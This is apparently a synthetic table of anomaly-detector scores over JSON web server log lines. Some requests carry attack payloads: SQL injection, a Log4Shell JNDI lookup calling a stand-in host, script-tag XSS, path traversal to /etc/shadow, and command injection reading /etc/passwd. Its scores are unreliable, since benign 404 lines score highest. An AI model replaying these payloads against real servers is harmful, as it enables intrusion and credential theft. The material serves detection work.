score_content,score_session,score_fused,score_fused_norm,line
30.798187255859375,,30.798187255859375,30.798187255859375,{"remote_addr": "89.24.136.198", "time_local": "11/Jan/2025:09:01:45 -0700", "request": "DELETE / HTTP/2", "status": 304, "body_bytes_sent": 13933, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
13.468709945678711,,13.468709945678711,13.468709945678711,{"remote_addr": "14.31.201.85", "time_local": "11/Jan/2025:09:01:45 -0700", "request": "PUT /login HTTP/2", "status": 200, "body_bytes_sent": 16994, "http_referer": "https://twitter.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
104.75299835205078,,104.75299835205078,104.75299835205078,{"remote_addr": "140.152.200.167", "time_local": "11/Jan/2025:09:01:46 -0700", "request": "TRACE /phpmyadmin HTTP/2", "status": 200, "body_bytes_sent": 9745, "http_referer": "https://www.google.com/", "http_user_agent": "curl/7.85.0"}
36.18313980102539,,36.18313980102539,36.18313980102539,{"remote_addr": "214.129.95.226", "time_local": "11/Jan/2025:09:01:47 -0700", "request": "PUT /search?q=laptop HTTP/2", "status": 200, "body_bytes_sent": 871, "http_referer": "https://twitter.com/", "http_user_agent": "curl/7.85.0"}
30126.873046875,,30126.873046875,30126.873046875,{"remote_addr": "180.195.10.105", "time_local": "11/Jan/2025:09:01:47 -0700", "request": "POST / HTTP/2", "status": 401, "body_bytes_sent": 1038, "http_referer": "https://www.google.com/", "http_user_agent": "dirb/2.22"}
27.6649227142334,,27.6649227142334,27.6649227142334,{"remote_addr": "227.235.156.61", "time_local": "11/Jan/2025:09:01:48 -0700", "request": "POST /search?q=ssd HTTP/2", "status": 200, "body_bytes_sent": 9581, "http_referer": "https://example.com/", "http_user_agent": "dirb/2.22"}
70.52606964111328,,70.52606964111328,70.52606964111328,{"remote_addr": "209.134.67.118", "time_local": "11/Jan/2025:09:01:49 -0700", "request": "HEAD /search?q=camera HTTP/2", "status": 200, "body_bytes_sent": 12338, "http_referer": "-", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
11045.8779296875,,11045.8779296875,11045.8779296875,{"remote_addr": "216.178.25.216", "time_local": "11/Jan/2025:09:01:49 -0700", "request": "GET /search?q=router HTTP/2", "status": 503, "body_bytes_sent": 1163, "http_referer": "-", "http_user_agent": "python-requests/2.31.0"}
50.560787200927734,,50.560787200927734,50.560787200927734,{"remote_addr": "83.167.147.230", "time_local": "11/Jan/2025:09:01:50 -0700", "request": "DELETE /search?q=ssd HTTP/2", "status": 200, "body_bytes_sent": 8054, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "python-requests/2.31.0"}
96.12091827392578,,96.12091827392578,96.12091827392578,{"remote_addr": "46.194.230.110", "time_local": "11/Jan/2025:09:01:50 -0700", "request": "OPTIONS /search?q=%27+OR+1%3D1+-- HTTP/2", "status": 200, "body_bytes_sent": 4887, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "curl/7.85.0"}
96.41400909423828,,96.41400909423828,96.41400909423828,{"remote_addr": "39.2.16.176", "time_local": "11/Jan/2025:09:01:51 -0700", "request": "OPTIONS /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/2", "status": 200, "body_bytes_sent": 6976, "http_referer": "https://example.com/", "http_user_agent": "python-requests/2.31.0"}
3.059333086013794,,3.059333086013794,3.059333086013794,{"remote_addr": "231.189.216.167", "time_local": "11/Jan/2025:09:01:52 -0700", "request": "GET /assets/app.js HTTP/2", "status": 304, "body_bytes_sent": 11903, "http_referer": "https://twitter.com/", "http_user_agent": "python-requests/2.31.0"}
50.5433235168457,,50.5433235168457,50.5433235168457,{"remote_addr": "207.136.133.188", "time_local": "11/Jan/2025:09:01:53 -0700", "request": "DELETE /search?q=phone HTTP/2", "status": 200, "body_bytes_sent": 16819, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
2.139151096343994,,2.139151096343994,2.139151096343994,{"remote_addr": "146.182.77.167", "time_local": "11/Jan/2025:09:01:53 -0700", "request": "GET / HTTP/2", "status": 200, "body_bytes_sent": 2196, "http_referer": "-", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
96.31884002685547,,96.31884002685547,96.31884002685547,{"remote_addr": "214.105.192.222", "time_local": "11/Jan/2025:09:01:54 -0700", "request": "OPTIONS /api/product?id=123 HTTP/2", "status": 200, "body_bytes_sent": 13795, "http_referer": "-", "http_user_agent": "sqlmap/1.7.2#stable"}
4.845164775848389,,4.845164775848389,4.845164775848389,{"remote_addr": "146.58.16.139", "time_local": "11/Jan/2025:09:01:55 -0700", "request": "POST /about HTTP/2", "status": 200, "body_bytes_sent": 8275, "http_referer": "-", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
1.9616461992263794,,1.9616461992263794,1.9616461992263794,{"remote_addr": "44.88.170.126", "time_local": "11/Jan/2025:09:01:56 -0700", "request": "GET /login HTTP/2", "status": 200, "body_bytes_sent": 9927, "http_referer": "https://example.com/", "http_user_agent": "dirb/2.22"}
45.9656982421875,,45.9656982421875,45.9656982421875,{"remote_addr": "237.141.5.209", "time_local": "11/Jan/2025:09:01:56 -0700", "request": "HEAD /cgi-bin/test.cgi HTTP/2", "status": 200, "body_bytes_sent": 11037, "http_referer": "https://twitter.com/", "http_user_agent": "python-requests/2.31.0"}
1.9688228368759155,,1.9688228368759155,1.9688228368759155,{"remote_addr": "87.8.253.20", "time_local": "11/Jan/2025:09:01:57 -0700", "request": "GET /login HTTP/2", "status": 200, "body_bytes_sent": 12110, "http_referer": "https://www.google.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
50.80778503417969,,50.80778503417969,50.80778503417969,{"remote_addr": "167.121.52.152", "time_local": "11/Jan/2025:09:01:58 -0700", "request": "DELETE /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/2", "status": 200, "body_bytes_sent": 17439, "http_referer": "-", "http_user_agent": "curl/7.85.0"}
0.2441861480474472,,0.2441861480474472,0.2441861480474472,{"remote_addr": "120.48.249.38", "time_local": "11/Jan/2025:09:01:59 -0700", "request": "GET /assets/app.js HTTP/2", "status": 200, "body_bytes_sent": 17442, "http_referer": "https://twitter.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
36.18745040893555,,36.18745040893555,36.18745040893555,{"remote_addr": "119.149.174.112", "time_local": "11/Jan/2025:09:02:00 -0700", "request": "PUT /search?q=router HTTP/2", "status": 200, "body_bytes_sent": 7297, "http_referer": "https://twitter.com/", "http_user_agent": "nikto/2.5.0"}
27.59265899658203,,27.59265899658203,27.59265899658203,{"remote_addr": "236.224.251.54", "time_local": "11/Jan/2025:09:02:01 -0700", "request": "POST /search?q=laptop HTTP/2", "status": 200, "body_bytes_sent": 7714, "http_referer": "https://example.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
104.89958190917969,,104.89958190917969,104.89958190917969,{"remote_addr": "98.159.247.224", "time_local": "11/Jan/2025:09:02:01 -0700", "request": "TRACE /login HTTP/2", "status": 200, "body_bytes_sent": 6190, "http_referer": "https://example.com/", "http_user_agent": "dirb/2.22"}
7.634860515594482,,7.634860515594482,7.634860515594482,{"remote_addr": "94.187.2.181", "time_local": "11/Jan/2025:09:02:02 -0700", "request": "POST /contact HTTP/2", "status": 304, "body_bytes_sent": 17150, "http_referer": "https://twitter.com/", "http_user_agent": "python-requests/2.31.0"}
50.55348205566406,,50.55348205566406,50.55348205566406,{"remote_addr": "68.54.200.73", "time_local": "11/Jan/2025:09:02:03 -0700", "request": "HEAD /logout HTTP/2", "status": 304, "body_bytes_sent": 8366, "http_referer": "https://twitter.com/", "http_user_agent": "python-requests/2.31.0"}
11.760415077209473,,11.760415077209473,11.760415077209473,{"remote_addr": "247.209.136.81", "time_local": "11/Jan/2025:09:02:03 -0700", "request": "PUT /index.html HTTP/2", "status": 200, "body_bytes_sent": 3654, "http_referer": "https://twitter.com/", "http_user_agent": "python-requests/2.31.0"}
47.647769927978516,,47.647769927978516,47.647769927978516,{"remote_addr": "99.162.66.26", "time_local": "11/Jan/2025:09:02:04 -0700", "request": "HEAD /dashboard HTTP/2", "status": 200, "body_bytes_sent": 15573, "http_referer": "https://example.com/", "http_user_agent": "curl/7.85.0"}
4.846895217895508,,4.846895217895508,4.846895217895508,{"remote_addr": "59.120.59.209", "time_local": "11/Jan/2025:09:02:04 -0700", "request": "POST /about HTTP/2", "status": 200, "body_bytes_sent": 8762, "http_referer": "https://twitter.com/", "http_user_agent": "nikto/2.5.0"}
50.509769439697266,,50.509769439697266,50.509769439697266,{"remote_addr": "199.52.38.3", "time_local": "11/Jan/2025:09:02:05 -0700", "request": "DELETE /search?q=router HTTP/2", "status": 200, "body_bytes_sent": 12247, "http_referer": "https://twitter.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
70.77948760986328,,70.77948760986328,70.77948760986328,{"remote_addr": "212.113.107.116", "time_local": "11/Jan/2025:09:02:06 -0700", "request": "HEAD /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/2", "status": 200, "body_bytes_sent": 4192, "http_referer": "https://twitter.com/", "http_user_agent": "nikto/2.5.0"}
0.4882211685180664,,0.4882211685180664,0.4882211685180664,{"remote_addr": "46.125.92.133", "time_local": "11/Jan/2025:09:02:07 -0700", "request": "GET /.env HTTP/2", "status": 201, "body_bytes_sent": 8623, "http_referer": "https://example.com/", "http_user_agent": "dirb/2.22"}
24.726842880249023,,24.726842880249023,24.726842880249023,{"remote_addr": "127.35.170.85", "time_local": "11/Jan/2025:09:02:08 -0700", "request": "GET /search?q=camera HTTP/2", "status": 204, "body_bytes_sent": 16126, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "nikto/2.5.0"}
30.41326332092285,,30.41326332092285,30.41326332092285,{"remote_addr": "204.239.16.15", "time_local": "11/Jan/2025:09:02:08 -0700", "request": "POST /search?q=laptop HTTP/2", "status": 304, "body_bytes_sent": 3315, "http_referer": "https://twitter.com/", "http_user_agent": "nikto/2.5.0"}
36.24211502075195,,36.24211502075195,36.24211502075195,{"remote_addr": "188.63.211.227", "time_local": "11/Jan/2025:09:02:09 -0700", "request": "PUT /api/product?id=123 HTTP/2", "status": 200, "body_bytes_sent": 5055, "http_referer": "-", "http_user_agent": "dirb/2.22"}
30216.810546875,,30216.810546875,30216.810546875,{"remote_addr": "105.193.195.149", "time_local": "11/Jan/2025:09:02:09 -0700", "request": "OPTIONS /search?q=monitor HTTP/2", "status": 400, "body_bytes_sent": 886, "http_referer": "https://twitter.com/", "http_user_agent": "dirb/2.22"}
1.8117117881774902,,1.8117117881774902,1.8117117881774902,{"remote_addr": "168.202.249.122", "time_local": "11/Jan/2025:09:02:10 -0700", "request": "GET /phpmyadmin HTTP/2", "status": 200, "body_bytes_sent": 13042, "http_referer": "https://www.google.com/", "http_user_agent": "python-requests/2.31.0"}
104.86161804199219,,104.86161804199219,104.86161804199219,{"remote_addr": "54.121.139.185", "time_local": "11/Jan/2025:09:02:11 -0700", "request": "TRACE /contact HTTP/2", "status": 200, "body_bytes_sent": 15511, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
47.580116271972656,,47.580116271972656,47.580116271972656,{"remote_addr": "243.128.152.12", "time_local": "11/Jan/2025:09:02:11 -0700", "request": "HEAD /phpmyadmin HTTP/2", "status": 200, "body_bytes_sent": 3921, "http_referer": "https://www.google.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
104.84494018554688,,104.84494018554688,104.84494018554688,{"remote_addr": "139.112.26.219", "time_local": "11/Jan/2025:09:02:12 -0700", "request": "TRACE /profile HTTP/2", "status": 200, "body_bytes_sent": 10147, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "nikto/2.5.0"}
71.81359100341797,,71.81359100341797,71.81359100341797,{"remote_addr": "225.128.177.215", "time_local": "11/Jan/2025:09:02:12 -0700", "request": "OPTIONS /index.html HTTP/2", "status": 200, "body_bytes_sent": 8022, "http_referer": "https://www.google.com/", "http_user_agent": "nikto/2.5.0"}
36.196468353271484,,36.196468353271484,36.196468353271484,{"remote_addr": "197.204.162.38", "time_local": "11/Jan/2025:09:02:13 -0700", "request": "PUT /search?q=phone HTTP/2", "status": 204, "body_bytes_sent": 5809, "http_referer": "https://twitter.com/", "http_user_agent": "dirb/2.22"}
36.27351379394531,,36.27351379394531,36.27351379394531,{"remote_addr": "20.122.182.168", "time_local": "11/Jan/2025:09:02:13 -0700", "request": "PUT /api/product?id=123 HTTP/2", "status": 204, "body_bytes_sent": 16228, "http_referer": "https://www.google.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
30148.982421875,,30148.982421875,30148.982421875,{"remote_addr": "182.45.202.185", "time_local": "11/Jan/2025:09:02:14 -0700", "request": "DELETE /api/products HTTP/2", "status": 401, "body_bytes_sent": 597, "http_referer": "https://www.google.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
104.8855972290039,,104.8855972290039,104.8855972290039,{"remote_addr": "96.25.104.161", "time_local": "11/Jan/2025:09:02:15 -0700", "request": "TRACE /logout HTTP/2", "status": 200, "body_bytes_sent": 12321, "http_referer": "https://twitter.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
4.834980487823486,,4.834980487823486,4.834980487823486,{"remote_addr": "119.219.147.138", "time_local": "11/Jan/2025:09:02:16 -0700", "request": "POST /about HTTP/2", "status": 200, "body_bytes_sent": 5490, "http_referer": "-", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
30135.5859375,,30135.5859375,30135.5859375,{"remote_addr": "78.133.152.155", "time_local": "11/Jan/2025:09:02:16 -0700", "request": "PUT / HTTP/2", "status": 404, "body_bytes_sent": 877, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "python-requests/2.31.0"}
46.05697250366211,,46.05697250366211,46.05697250366211,{"remote_addr": "186.163.11.66", "time_local": "11/Jan/2025:09:02:17 -0700", "request": "HEAD /wp-login.php HTTP/2", "status": 200, "body_bytes_sent": 13348, "http_referer": "https://twitter.com/", "http_user_agent": "nikto/2.5.0"}
103.24883270263672,,103.24883270263672,103.24883270263672,{"remote_addr": "120.109.50.112", "time_local": "11/Jan/2025:09:02:18 -0700", "request": "TRACE /index.html HTTP/2", "status": 200, "body_bytes_sent": 9068, "http_referer": "https://twitter.com/", "http_user_agent": "nikto/2.5.0"}
4.665247917175293,,4.665247917175293,4.665247917175293,{"remote_addr": "235.188.77.245", "time_local": "11/Jan/2025:09:02:18 -0700", "request": "GET /profile HTTP/2", "status": 301, "body_bytes_sent": 10393, "http_referer": "https://www.google.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
47.66761779785156,,47.66761779785156,47.66761779785156,{"remote_addr": "179.64.186.7", "time_local": "11/Jan/2025:09:02:19 -0700", "request": "HEAD /contact HTTP/2", "status": 200, "body_bytes_sent": 2395, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
0.1838064193725586,,0.1838064193725586,0.1838064193725586,{"remote_addr": "82.74.172.21", "time_local": "11/Jan/2025:09:02:19 -0700", "request": "GET /assets/app.css HTTP/2", "status": 200, "body_bytes_sent": 5543, "http_referer": "https://www.google.com/", "http_user_agent": "curl/7.85.0"}
1.724707841873169,,1.724707841873169,1.724707841873169,{"remote_addr": "205.126.90.190", "time_local": "11/Jan/2025:09:02:20 -0700", "request": "GET /server-status HTTP/2", "status": 200, "body_bytes_sent": 9608, "http_referer": "https://twitter.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
50.43092346191406,,50.43092346191406,50.43092346191406,{"remote_addr": "63.192.113.149", "time_local": "11/Jan/2025:09:02:21 -0700", "request": "HEAD /dashboard HTTP/2", "status": 302, "body_bytes_sent": 12399, "http_referer": "https://www.google.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
0.17590254545211792,,0.17590254545211792,0.17590254545211792,{"remote_addr": "238.29.96.92", "time_local": "11/Jan/2025:09:02:22 -0700", "request": "GET /assets/app.css HTTP/2", "status": 200, "body_bytes_sent": 1743, "http_referer": "-", "http_user_agent": "nikto/2.5.0"}
13.426782608032227,,13.426782608032227,13.426782608032227,{"remote_addr": "30.30.1.103", "time_local": "11/Jan/2025:09:02:22 -0700", "request": "PUT /about HTTP/2", "status": 200, "body_bytes_sent": 4263, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
47.67392349243164,,47.67392349243164,47.67392349243164,{"remote_addr": "190.148.252.154", "time_local": "11/Jan/2025:09:02:23 -0700", "request": "HEAD /contact HTTP/2", "status": 200, "body_bytes_sent": 4820, "http_referer": "https://twitter.com/", "http_user_agent": "python-requests/2.31.0"}
96.23725891113281,,96.23725891113281,96.23725891113281,{"remote_addr": "79.100.12.205", "time_local": "11/Jan/2025:09:02:23 -0700", "request": "OPTIONS /search?q=router HTTP/2", "status": 204, "body_bytes_sent": 9574, "http_referer": "-", "http_user_agent": "nikto/2.5.0"}
47.613468170166016,,47.613468170166016,47.613468170166016,{"remote_addr": "9.156.203.140", "time_local": "11/Jan/2025:09:02:24 -0700", "request": "HEAD /phpmyadmin HTTP/2", "status": 200, "body_bytes_sent": 13620, "http_referer": "https://twitter.com/", "http_user_agent": "python-requests/2.31.0"}
11025.7177734375,,11025.7177734375,11025.7177734375,{"remote_addr": "37.114.55.228", "time_local": "11/Jan/2025:09:02:24 -0700", "request": "POST /api/products HTTP/2", "status": 500, "body_bytes_sent": 1019, "http_referer": "https://example.com/", "http_user_agent": "dirb/2.22"}
127.96281433105469,,127.96281433105469,127.96281433105469,{"remote_addr": "24.168.60.45", "time_local": "11/Jan/2025:09:02:25 -0700", "request": "TRACE /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/2", "status": 200, "body_bytes_sent": 10918, "http_referer": "-", "http_user_agent": "nikto/2.5.0"}
127.65882110595703,,127.65882110595703,127.65882110595703,{"remote_addr": "99.66.73.250", "time_local": "11/Jan/2025:09:02:26 -0700", "request": "TRACE /search?q=laptop HTTP/2", "status": 200, "body_bytes_sent": 5551, "http_referer": "https://www.google.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
96.21891784667969,,96.21891784667969,96.21891784667969,{"remote_addr": "166.218.117.180", "time_local": "11/Jan/2025:09:02:27 -0700", "request": "OPTIONS /search?q=monitor HTTP/2", "status": 200, "body_bytes_sent": 8042, "http_referer": "-", "http_user_agent": "sqlmap/1.7.2#stable"}
73.35978698730469,,73.35978698730469,73.35978698730469,{"remote_addr": "8.2.217.85", "time_local": "11/Jan/2025:09:02:28 -0700", "request": "OPTIONS /api/products HTTP/2", "status": 200, "body_bytes_sent": 2573, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
27.724925994873047,,27.724925994873047,27.724925994873047,{"remote_addr": "76.253.83.134", "time_local": "11/Jan/2025:09:02:28 -0700", "request": "DELETE /logout HTTP/2", "status": 200, "body_bytes_sent": 13019, "http_referer": "https://twitter.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
27.581371307373047,,27.581371307373047,27.581371307373047,{"remote_addr": "95.156.170.54", "time_local": "11/Jan/2025:09:02:28 -0700", "request": "POST /search?q=laptop HTTP/2", "status": 200, "body_bytes_sent": 1144, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
30122.091796875,,30122.091796875,30122.091796875,{"remote_addr": "43.180.206.78", "time_local": "11/Jan/2025:09:02:29 -0700", "request": "GET /assets/app.js HTTP/2", "status": 404, "body_bytes_sent": 1330, "http_referer": "https://www.google.com/", "http_user_agent": "curl/7.85.0"}
1.8918108940124512,,1.8918108940124512,1.8918108940124512,{"remote_addr": "204.15.162.39", "time_local": "11/Jan/2025:09:02:29 -0700", "request": "GET /contact HTTP/2", "status": 200, "body_bytes_sent": 9699, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
13.396563529968262,,13.396563529968262,13.396563529968262,{"remote_addr": "82.122.219.183", "time_local": "11/Jan/2025:09:02:30 -0700", "request": "PUT /profile HTTP/2", "status": 200, "body_bytes_sent": 15885, "http_referer": "-", "http_user_agent": "sqlmap/1.7.2#stable"}
3.3651959896087646,,3.3651959896087646,3.3651959896087646,{"remote_addr": "116.205.80.168", "time_local": "11/Jan/2025:09:02:31 -0700", "request": "POST /.env HTTP/2", "status": 200, "body_bytes_sent": 1118, "http_referer": "https://example.com/", "http_user_agent": "python-requests/2.31.0"}
107.65349578857422,,107.65349578857422,107.65349578857422,{"remote_addr": "50.53.75.50", "time_local": "11/Jan/2025:09:02:32 -0700", "request": "TRACE /logout HTTP/2", "status": 301, "body_bytes_sent": 10746, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
96.3151626586914,,96.3151626586914,96.3151626586914,{"remote_addr": "31.31.236.208", "time_local": "11/Jan/2025:09:02:33 -0700", "request": "OPTIONS /search?q=ssd HTTP/2", "status": 200, "body_bytes_sent": 11727, "http_referer": "https://www.google.com/", "http_user_agent": "nikto/2.5.0"}
4.625655651092529,,4.625655651092529,4.625655651092529,{"remote_addr": "101.169.184.209", "time_local": "11/Jan/2025:09:02:33 -0700", "request": "POST /server-status HTTP/2", "status": 200, "body_bytes_sent": 13194, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "python-requests/2.31.0"}
104.65766906738281,,104.65766906738281,104.65766906738281,{"remote_addr": "218.196.134.245", "time_local": "11/Jan/2025:09:02:34 -0700", "request": "TRACE /server-status HTTP/2", "status": 200, "body_bytes_sent": 1262, "http_referer": "https://example.com/", "http_user_agent": "python-requests/2.31.0"}
4.640045166015625,,4.640045166015625,4.640045166015625,{"remote_addr": "177.9.238.231", "time_local": "11/Jan/2025:09:02:35 -0700", "request": "GET /api/products HTTP/2", "status": 301, "body_bytes_sent": 11660, "http_referer": "https://example.com/", "http_user_agent": "nikto/2.5.0"}
2.183035135269165,,2.183035135269165,2.183035135269165,{"remote_addr": "62.235.103.70", "time_local": "11/Jan/2025:09:02:36 -0700", "request": "GET / HTTP/2", "status": 200, "body_bytes_sent": 16188, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
27.70191192626953,,27.70191192626953,27.70191192626953,{"remote_addr": "122.196.51.100", "time_local": "11/Jan/2025:09:02:36 -0700", "request": "POST /api/backup?file=../../../../etc/shadow HTTP/2", "status": 200, "body_bytes_sent": 875, "http_referer": "https://twitter.com/", "http_user_agent": "dirb/2.22"}
50.5427360534668,,50.5427360534668,50.5427360534668,{"remote_addr": "25.159.2.37", "time_local": "11/Jan/2025:09:02:37 -0700", "request": "HEAD /login HTTP/2", "status": 301, "body_bytes_sent": 12676, "http_referer": "https://twitter.com/", "http_user_agent": "nikto/2.5.0"}
0.229139506816864,,0.229139506816864,0.229139506816864,{"remote_addr": "4.96.158.84", "time_local": "11/Jan/2025:09:02:39 -0700", "request": "GET /assets/app.css HTTP/2", "status": 200, "body_bytes_sent": 266, "http_referer": "https://twitter.com/", "http_user_agent": "curl/7.85.0"}
50.509403228759766,,50.509403228759766,50.509403228759766,{"remote_addr": "179.237.107.79", "time_local": "11/Jan/2025:09:02:39 -0700", "request": "DELETE /search?q=laptop HTTP/2", "status": 200, "body_bytes_sent": 12131, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
3.0400147438049316,,3.0400147438049316,3.0400147438049316,{"remote_addr": "102.250.69.124", "time_local": "11/Jan/2025:09:02:40 -0700", "request": "GET /.git/config HTTP/2", "status": 302, "body_bytes_sent": 4023, "http_referer": "https://www.google.com/", "http_user_agent": "python-requests/2.31.0"}
30158.279296875,,30158.279296875,30158.279296875,{"remote_addr": "220.49.155.98", "time_local": "11/Jan/2025:09:02:40 -0700", "request": "PUT /search?q=ssd HTTP/2", "status": 404, "body_bytes_sent": 710, "http_referer": "https://example.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
4.802810192108154,,4.802810192108154,4.802810192108154,{"remote_addr": "210.158.155.13", "time_local": "11/Jan/2025:09:02:41 -0700", "request": "POST /profile HTTP/2", "status": 200, "body_bytes_sent": 16777, "http_referer": "-", "http_user_agent": "dirb/2.22"}
30.42853355407715,,30.42853355407715,30.42853355407715,{"remote_addr": "55.13.125.90", "time_local": "11/Jan/2025:09:02:42 -0700", "request": "DELETE /dashboard HTTP/2", "status": 304, "body_bytes_sent": 3220, "http_referer": "https://example.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
3.170388698577881,,3.170388698577881,3.170388698577881,{"remote_addr": "191.43.194.170", "time_local": "11/Jan/2025:09:02:43 -0700", "request": "POST /index.html HTTP/2", "status": 200, "body_bytes_sent": 5409, "http_referer": "https://www.google.com/", "http_user_agent": "curl/7.85.0"}
27.686250686645508,,27.686250686645508,27.686250686645508,{"remote_addr": "31.67.246.156", "time_local": "11/Jan/2025:09:02:44 -0700", "request": "POST /search?q=ssd HTTP/2", "status": 201, "body_bytes_sent": 17114, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "dirb/2.22"}
30158.17578125,,30158.17578125,30158.17578125,{"remote_addr": "56.19.61.14", "time_local": "11/Jan/2025:09:02:45 -0700", "request": "PUT /search?q=monitor HTTP/2", "status": 404, "body_bytes_sent": 1275, "http_referer": "https://www.google.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
50.544246673583984,,50.544246673583984,50.544246673583984,{"remote_addr": "60.100.221.193", "time_local": "11/Jan/2025:09:02:45 -0700", "request": "DELETE /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/2", "status": 200, "body_bytes_sent": 16866, "http_referer": "https://example.com/", "http_user_agent": "dirb/2.22"}
36.23997497558594,,36.23997497558594,36.23997497558594,{"remote_addr": "2.202.77.254", "time_local": "11/Jan/2025:09:02:46 -0700", "request": "PUT /api/product?id=123 HTTP/2", "status": 200, "body_bytes_sent": 4448, "http_referer": "https://twitter.com/", "http_user_agent": "dirb/2.22"}
27.736082077026367,,27.736082077026367,27.736082077026367,{"remote_addr": "72.9.66.15", "time_local": "11/Jan/2025:09:02:46 -0700", "request": "POST /api/backup?file=../../../../etc/shadow HTTP/2", "status": 200, "body_bytes_sent": 16433, "http_referer": "https://www.google.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
